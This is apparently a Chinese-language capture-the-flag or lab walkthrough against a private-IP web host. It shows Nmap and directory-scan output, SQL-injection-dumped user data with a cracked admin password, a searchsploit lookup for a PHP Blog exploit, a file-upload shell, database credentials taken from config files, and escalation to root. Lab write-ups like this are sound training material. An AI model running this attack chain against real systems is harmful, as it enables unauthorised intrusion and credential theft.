## 扫描结果

```
please input the ip address :192.168.80.144
start scan 192.168.80.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 18:50 CST
Nmap scan report for 192.168.80.144
Host is up (0.0069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 18:50 CST
Nmap scan report for 192.168.80.144
Host is up (0.0016s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 22.60 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 18:51 CST
Nmap scan report for 192.168.80.144
Host is up (0.0023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
|_http-server-header: Apache/2.2.17 (Ubuntu)
|_http-title: Welcome to this Site!
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 - 3.10 (95%), Linux 2.6.32 - 2.6.39 (94%), Linux 3.2 - 3.16 (94%), Iomega StorCenter ix4-200d (Linux 2.6.31) (94%), Linux 2.6.32 - 3.5 (93%), Linux 2.6.32 - 3.13 (92%), Android 4 (92%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   0.37 ms DESKTOP-SH1BMBR (172.26.32.1)
2   1.80 ms 192.168.80.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.53 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 18:51 CST
Nmap scan report for 192.168.80.144
Host is up (0.0013s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.80.144
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://192.168.80.144:80/register.php
|     Form id:
|     Form action: register.php
|
|     Path: http://192.168.80.144:80/login.php
|     Form id:
|_    Form action: login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-cookie-flags:
|   /:
|     PHPSESSID:
|       httponly flag not set
|   /login.php:
|     PHPSESSID:
|       httponly flag not set
|   /login/:
|     PHPSESSID:
|       httponly flag not set
|   /index/:
|     PHPSESSID:
|       httponly flag not set
|   /register/:
|     PHPSESSID:
|_      httponly flag not set
| http-enum:
|   /blog/: Blog
|   /login.php: Possible admin folder
|   /login/: Login page
|   /info.php: Possible information file
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.2.17 (ubuntu)'
|   /index/: Potentially interesting folder
|   /info/: Potentially interesting folder
|_  /register/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 36.72 seconds

# 扫描http://192.168.80.144/

/index.php            (Status: 200) [Size: 854]
/blog                 (Status: 301) [Size: 315] [--> http://192.168.80.144/blog/]
/login                (Status: 200) [Size: 1174]
/login.php            (Status: 200) [Size: 1174]
/register             (Status: 200) [Size: 1562]
/index                (Status: 200) [Size: 854]
/register.php         (Status: 200) [Size: 1562]
/info.php             (Status: 200) [Size: 49903]
/info                 (Status: 200) [Size: 49891]
/includes             (Status: 301) [Size: 319] [--> http://192.168.80.144/includes/]
/activate.php         (Status: 302) [Size: 0] [--> http://10.10.10.100/index.php]
/activate             (Status: 302) [Size: 0] [--> http://10.10.10.100/index.php]


# 扫描http://192.168.80.144/blog/

/images               (Status: 301) [Size: 322] [--> http://192.168.80.144/blog/images/]
/index.php            (Status: 200) [Size: 8100]
/index                (Status: 200) [Size: 8100]
/contact              (Status: 200) [Size: 5914]
/rss.php              (Status: 200) [Size: 1249]
/contact.php          (Status: 200) [Size: 5914]
/rss                  (Status: 200) [Size: 1249]
/login.php            (Status: 200) [Size: 5663]
/login                (Status: 200) [Size: 5663]
/content              (Status: 301) [Size: 323] [--> http://192.168.80.144/blog/content/]
/info                 (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/info.php             (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/docs                 (Status: 301) [Size: 320] [--> http://192.168.80.144/blog/docs/]
/themes               (Status: 301) [Size: 322] [--> http://192.168.80.144/blog/themes/]
/themes.php           (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/search               (Status: 200) [Size: 4947]
/comments.php         (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/comments             (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/search.php           (Status: 200) [Size: 4947]
/atom                 (Status: 200) [Size: 1068]
/atom.php             (Status: 200) [Size: 1068]
/static.php           (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/scripts              (Status: 301) [Size: 323] [--> http://192.168.80.144/blog/scripts/]
/static               (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/stats                (Status: 200) [Size: 5305]
/stats.php            (Status: 200) [Size: 5305]
/categories.php       (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/categories           (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/flash                (Status: 301) [Size: 321] [--> http://192.168.80.144/blog/flash/]
/add                  (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/add.php              (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/trackback.php        (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/trackback            (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/languages            (Status: 301) [Size: 325] [--> http://192.168.80.144/blog/languages/]
/languages.php        (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/upgrade.php          (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/upgrade              (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/logout.php           (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/logout               (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/options              (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/options.php          (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/interface            (Status: 301) [Size: 325] [--> http://192.168.80.144/blog/interface/]
/config               (Status: 301) [Size: 322] [--> http://192.168.80.144/blog/config/]
/rdf                  (Status: 200) [Size: 1425]
/rdf.php              (Status: 200) [Size: 1425]
/setup                (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/setup.php            (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/colors.php           (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/colors               (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/delete.php           (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
/delete               (Status: 302) [Size: 0] [--> http://192.168.80.144/blog/index.php]
```

## sql注入

```
database -> ch16
tables-> users
columns->
	user_id
	first_name
	last_name
	email
	pass
	user_level
	active
	registration_date







Dan,Privett  admin@isints.com
c2c4b4e51d9e23c02c15702c136c3e95: killerbeesareflying 


得到凭据：admin@isints.com:killerbeesareflying





http://192.168.80.144/blog/config/password.txt
	$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
	解不开
```

> searchsploit PHP Blog 0.4.0 -m 1191
![[Pasted image 20240116110439.png]]

>登录上传后得到shell

```
查找网站目录敏感文件：

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'goodday');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');

DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'root@ISIntS');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');


进行su root
发现切换成功
```

